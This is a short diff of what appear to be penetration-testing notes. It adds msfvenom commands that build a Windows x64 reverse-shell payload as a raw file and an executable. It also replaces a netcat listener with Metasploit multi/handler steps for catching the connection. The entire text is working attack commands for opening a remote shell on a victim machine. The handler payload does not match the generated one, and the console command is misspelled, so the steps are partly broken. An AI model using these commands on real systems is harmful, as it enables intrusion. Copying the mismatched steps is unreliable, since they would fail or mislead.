@@ -1,4 +1,15 @@
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f raw -o code.bin
+                                     or      
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f exe -o code.exe
+In other terminal 
+$ msf console
 
-On Other terminal
-$ nc -nvlp 443
+$ use exploit/multi/handler 
+
+$ set payload windows/meterpreter/reverse_tcp
+
+$ set lhost <ip>
+
+$ set lport <port>
+
+$exploit
